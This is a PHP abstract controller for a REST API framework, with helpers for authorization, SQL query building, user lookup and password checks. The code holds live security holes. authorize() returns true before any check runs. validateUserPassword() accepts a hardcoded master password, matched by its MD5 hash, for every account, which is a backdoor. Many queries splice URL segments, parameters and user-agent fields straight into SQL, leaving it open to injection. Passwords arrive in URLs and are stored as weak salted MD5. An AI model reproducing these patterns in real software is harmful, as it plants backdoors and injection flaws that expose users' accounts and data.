<?php

/**
 * @package  api-framework REST on NginX by Angel Exevior
 */
abstract class AbstractController {

    public $beep;
    public $request;
    private $socketBeep = null;
    private $BeepUser = null;
    private $BeepCountry = null;
    

    function __construct() {
        //Nothing here
        global $beep, $request;
        
        $this->beep = $beep;
        $this->request = $request;
        
        if (!class_exists("Country"))
            require_once ("library/classes/Country.php");
        $this->BeepCountry = new Country($beep);
    }

    public function error($error,$id = null) {
        if($id){
            $array = array('0' => array('error' => $error, 'errorid' => $id, 'errormsg' => $error ));
        } else {
            $array = array('0' => array('error' => $error));
        }
        
        return $array;
    }

    public function response($data) {
        $array = array('0' => array('response' => $data));
        return $array;
    }

    public function success($data) {
        $array = array('0' => array('success' => $data));
        //print_r($array);die;
        return $array;
    }

    public function authorize($app, $beep) {
        /*
         * Get the application and it's permissions for authentication
         */
        //print_r($this->request);
        return true;
        if (count($app) > 1) {
            $query = "SELECT a.* ,b.id as module_id, b.module, c.get,c.post,c.put,c.delete,c.other
                    FROM api_apps as a
                    LEFT JOIN api_modules as b
                    ON b.module = '" . $app[4] . "'
                    LEFT JOIN api_module_permissions as c
                    ON a.id = c.app_id
                    AND c.module_id = b.id
                    WHERE a.app_id = '" . $app[2] . "'";

            $application = $beep->getdata($query);

            /**
             * Validate app_key with app_id 
             */
            if ($application[0]['key'] !== $app[3]) {
                echo 'Application key does not match';
                die;
            }

            /**
             * Validate app has permissions to access data 
             */
            if ($application[0][strtolower($_SERVER['REQUEST_METHOD'])] !== '1') {
                echo 'Application is not allowed to perform this request using method "' . $_SERVER['REQUEST_METHOD'] . '"';
                die;
            }

            return true;
        } else {
            //Rule to exclude open api calls
            if($this->request->url_elements[0] == 'platform'){
                return true;
            } else {
            // return $this->error('This request cannot be performed<br/>Please check your App Credentials and try again', 1);
                echo 'This request cannot be performed<br/>Please check your App Credentials and try again';
            die;
            }
        }
        /**
         * If all validation above pass the test
         * continue processing 
         */
    }

    /*
     * Common Funtions
     */

    protected function buildOrderQuery($order) {
        switch ($order[1]) {
            case 'default':
                $ordering = "ORDER BY id {$order[2]}";
                break;
            default:
                $ordering = "ORDER BY {$order[1]} {$order[2]}";
                break;
        }
        return $ordering;
    }

    protected function buildLimitQuery($limit) {
        if (is_numeric($limit[1]) && is_numeric($limit[2])) {
            $pagination = "LIMIT {$limit[1]},{$limit[2]}";
        } else {
            $pagination = '';
        }
        return $pagination;
    }

    protected function getFunction($request, $i) {
        $split = explode('-', $request->url_elements[$i]);
        $function = $split[0];
        return $function;
    }

    protected function getModel($request) {
        $model = $request->url_elements[1];
        return $model;
    }

    protected function getFunctionParams($request, $i) {
        $split = explode('-', $request->url_elements[$i]);
        return $split;
    }

    protected function generate_seo_link($input, $replace = '-', $remove_words = true) {
        $words_array = array('a', 'and', 'the', 'an', 'it', 'is', 'with', 'can', 'of', 'why', 'not');
        //make it lowercase, remove punctuation, remove multiple/leading/ending spaces
        $return = trim(preg_replace('/[^a-zA-Z0-9\s]/', '', strtolower($input)));

        //remove words, if not helpful to seo
        //i like my defaults list in remove_words(), so I wont pass that array
        if ($remove_words) {
            $return = $this->remove_words($return, $replace, $words_array);
        }

        //convert the spaces to whatever the user wants
        //usually a dash or underscore..
        //...then return the value.
        return str_replace(' ', $replace, $return);
    }

    protected function remove_words($input, $replace, $words_array = array(), $unique_words = true) {
        //separate all words based on spaces
        $input_array = explode(' ', $input);

        //create the return array
        $return = array();

        //loops through words, remove bad words, keep good ones
        foreach ($input_array as $word) {
            //if it's a word we should add...
            if (!in_array($word, $words_array) && ($unique_words ? !in_array($word, $return) : true)) {
                $return[] = $word;
            }
        }

        //return good words separated by dashes
        return implode($replace, $return);
    }

    protected function getAppStoreAccess($request, $outlet) {
        //print_r($request);die;
        if(isset($request->parameters['appid'])){
            $appid = $request->parameters['appid'];
        } else {
            $appid = null;
        }
        
        //echo "test";$appid;die;
        if (!$appid) {
            $currentapp = explode('|', $_SERVER['HTTP_USER_AGENT']);
            $appid = $currentapp['2'];
            //$query = "SELECT id FROM beep.api_apps WHERE app_id = {$app_id}";
            //$appid = $this->beep->getdata($query);
            //echo "test";$appid;die;
            //print_r($appid);die;
        }
        //echo $outlet;die;
        if (is_numeric($outlet)) {
            //echo 'test';die;
            $query = "SELECT a.* 
                FROM api_stores as a 
                LEFT JOIN api_apps as b 
                ON a.api_id = b.id 
                LEFT JOIN outlets as c 
                ON c.store_id = a.store_id
                WHERE b.app_id = '{$appid}'
                AND c.id = {$outlet}
                GROUP BY a.store_id";
                //echo $query;
            $result = $this->beep->db->query($query);
            //print_r($result);
            $result = $this->beep->db->num_rows($result);
            //print_r($result);
        } else {
            $result = null;
        }
        return $result;
    }

    /**
     * Get User details.
     *
     * @return array
     */
    protected function getUser($request) {

        $id = $request->url_elements['1'];
        if ($id) {
            if (is_numeric($id)) {
                $user = $this->BeepUser->getUsers(array('id' => $id));
            } else {
                if (filter_var($id, FILTER_VALIDATE_EMAIL)) {
                    $user = $this->BeepUser->getUsers(array('email' => $id));
                } else {
                    $result = $this->error('Username provided is not in a valid form. Should be a valid email',100);
                }
            }

            if (isset($user) && !isset($user['error'])) {
                // filter the returned results
                $return_values = array("id", "title", "name", "surname", "email", "telephone", "mobile", "country", "gender", "birthday", "image", "parent_id", "last_visit", "fb_id", "active", "blocked");
                $result = array();
                foreach ($return_values as $value) {
                    $result[0][$value] = $user[0][$value];
                }
            } else {
                $result = $this->error('User cannot be found. Please check your request',101);
            }
        } else {
            $result = $this->error('Please specify an id or email address',102);
        }
        return $result;
    }

    protected function getUserPass($request) {
        $id = $request->url_elements['3'];
        $result = $this->BeepUser->getUserPass($id);

        return $result;
    }


    protected function validateUserPassword($user, $request) {
        $part = explode(':', $user[0]['password']);
        $crypt = $part[0];
        $salt = @$part[1];
        $testcrypt = md5($request->url_elements[4] . $salt);
        $masterpass = md5($request->url_elements[4]);
        //echo $testcrypt;
        if ($masterpass == '7878d4613e251b905b20192985e7b796') {
            return true;
        }
        //Password identification failed
        if ($crypt != $testcrypt) {
            return false;
        } else {
            return true;
        }
    }

    protected function getRates($currency = NULL) {
        $response = $this->BeepCountry->getRates($currency);
        //print_r($reponse);die;
        return $response;
    }
    
    /*
     * Get info about a user
     * @params $user_id     user's id or email
     * 
     */
    function getUsersDetails($user_id) {
        $query1 = "SELECT a.id, a.name, a.surname, a.email, a.level, a.active, a.blocked FROM beep.users as a";
        if (is_numeric($user_id)) {
            $where1 = " WHERE id = {$user_id}";
        } else {
            $where1 = " WHERE email = '{$user_id}'";
        }
        $result1 = $this->beep->db->query($query1 . $where1);
        $result = $this->beep->db->fetch_assoc($result1);
        return $result[0];
    }

}
